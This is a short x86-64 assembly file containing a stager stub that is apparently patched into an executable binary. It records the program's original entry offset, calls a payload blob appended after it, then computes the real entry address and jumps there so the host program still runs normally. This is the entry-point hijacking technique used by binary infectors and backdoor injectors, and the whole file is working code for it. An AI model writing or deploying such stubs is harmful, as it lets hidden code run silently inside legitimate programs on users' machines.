.intel_syntax noprefix

base:
    jmp past

e_entry:
.long 0

patch_ofs:
.long 0

past:
    push rdi                   /* Preserve registers */
    push rsi                   /*   ... */
    push rdx                   /*   ... */
    call payload               /* Call the payload */
    mov eax, [rip + e_entry]   /* Get offset of real entry  */
    mov ebx, [rip + patch_ofs] /* Get offset of the stager */
    sub rbx, rax               /* Compute the delta between the stager and the real entry offsets */
    lea r10, [rip + base]      /* Get vaddr of the stager */
    sub r10, rbx               /* Subtract the delta from vaddr of the stager to get the vaddr of real entry */
    pop rdx                    /* Restore registers */
    pop rsi                    /*   ... */
    pop rdi                    /*   ... */
    jmp r10                    /* Jump to real entry */

payload:
/* Payload blob is appended to the end of this blob */
